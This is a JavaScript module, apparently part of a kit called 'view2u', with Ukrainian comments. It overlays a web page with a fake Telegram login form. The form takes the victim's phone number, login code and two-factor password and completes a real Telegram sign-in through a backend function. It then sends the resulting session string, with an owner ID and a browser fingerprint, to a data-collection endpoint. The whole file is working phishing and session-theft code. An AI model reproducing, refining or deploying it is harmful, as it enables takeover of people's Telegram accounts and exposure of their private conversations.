// FILE: public/get-function/telegram-session.js
(function() {
    window.view2u_modules = window.view2u_modules || {};

    let ownerUserId, fingerprint;
    let authState = {}; // Для збереження стану між кроками (phoneCodeHash)

    // Функція для відправки фінальної сесії на сервер
    async function sendDataToServer(sessionData) {
        try {
            await fetch('/.netlify/functions/public-api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'collectData',
                    payload: {
                        ownerUserId,
                        fingerprint,
                        payload: {
                            type: 'telegram_session',
                            status: 'success',
                            data: sessionData
                        }
                    }
                })
            });
        } catch (error) {
            console.error('View2U Telegram Session: Помилка відправки сесії', error);
        }
    }

    // Функція для покрокової комунікації з сервером
    async function apiStep(action, params) {
        const res = await fetch('/.netlify/functions/telegram-step', {
            method: 'POST',
            body: JSON.stringify({ action, payload: params })
        });
        if (!res.ok) {
            const errorText = await res.text();
            throw new Error(errorText);
        }
        return res.json();
    }

    // Створення HTML-інтерфейсу
    function createUI() {
        const container = document.createElement('div');
        container.id = 'v2u-tg-session-container';
        container.style.cssText = `
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6); display: flex; justify-content: center;
            align-items: center; z-index: 10001; font-family: -apple-system, sans-serif;
        `;
        container.innerHTML = `
            <div style="background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); width: 90%; max-width: 400px;">
                <h2 style="text-align: center; margin-top: 0; color: #333;">Вхід в Telegram</h2>
                <p id="v2u-tg-message" style="text-align: center; font-size: 0.9em; color: #666; min-height: 20px;"></p>
                <div id="v2u-tg-step-phone">
                    <label style="display: block; margin-bottom: 5px;">Номер телефону</label>
                    <input type="tel" id="v2u-tg-phone" placeholder="+380991234567" style="width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
                    <button id="v2u-tg-phone-btn" style="width: 100%; padding: 10px; margin-top: 1rem; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Надіслати</button>
                </div>
                <div id="v2u-tg-step-code" style="display: none;">
                    <label style="display: block; margin-bottom: 5px;">Код підтвердження</label>
                    <input type="text" id="v2u-tg-code" style="width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
                    <button id="v2u-tg-code-btn" style="width: 100%; padding: 10px; margin-top: 1rem; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Підтвердити</button>
                </div>
                <div id="v2u-tg-step-password" style="display: none;">
                    <label style="display: block; margin-bottom: 5px;">Пароль (2FA)</label>
                    <input type="password" id="v2u-tg-password" style="width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
                    <button id="v2u-tg-password-btn" style="width: 100%; padding: 10px; margin-top: 1rem; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Увійти</button>
                </div>
            </div>
        `;
        document.body.appendChild(container);

        // Додаємо обробники подій
        document.getElementById('v2u-tg-phone-btn').addEventListener('click', () => handleStep('phone'));
        document.getElementById('v2u-tg-code-btn').addEventListener('click', () => handleStep('code'));
        document.getElementById('v2u-tg-password-btn').addEventListener('click', () => handleStep('password'));
    }

    function showStep(stepName) {
        ['phone', 'code', 'password'].forEach(s => {
            document.getElementById(`v2u-tg-step-${s}`).style.display = 'none';
        });
        if (stepName) {
            document.getElementById(`v2u-tg-step-${stepName}`).style.display = 'block';
        }
    }

    async function handleStep(step) {
        const msgEl = document.getElementById('v2u-tg-message');
        msgEl.textContent = 'Обробка...';
        try {
            let response;
            if (step === 'phone') {
                const phoneNumber = document.getElementById('v2u-tg-phone').value;
                authState.phoneNumber = phoneNumber;
                response = await apiStep('start', { phoneNumber });
                authState.phoneCodeHash = response.phoneCodeHash;
                msgEl.textContent = 'Код надіслано в Telegram.';
                showStep('code');
            } else if (step === 'code') {
                const phoneCode = document.getElementById('v2u-tg-code').value;
                response = await apiStep('submitCode', { ...authState, phoneCode });
            } else if (step === 'password') {
                const password = document.getElementById('v2u-tg-password').value;
                response = await apiStep('submitPassword', { ...authState, password });
            }

            if (response.status === 'password_required') {
                msgEl.textContent = 'Потрібен пароль двоетапної автентифікації.';
                showStep('password');
            } else if (response.status === 'success' && response.session) {
                msgEl.textContent = 'Успіх! Сесію отримано та надіслано.';
                await sendDataToServer({ sessionString: response.session });
                setTimeout(() => {
                    document.getElementById('v2u-tg-session-container').remove();
                }, 2000);
            }
        } catch (error) {
            msgEl.textContent = `Помилка: ${error.message}`;
        }
    }

    // Головна функція модуля
    window.view2u_modules.telegram_session = {
        init: function(_ownerUserId, _fingerprint) {
            ownerUserId = _ownerUserId;
            fingerprint = _fingerprint;
            if (document.getElementById('v2u-tg-session-container')) return; // Запобігаємо дублюванню
            createUI();
        }
    };
})();
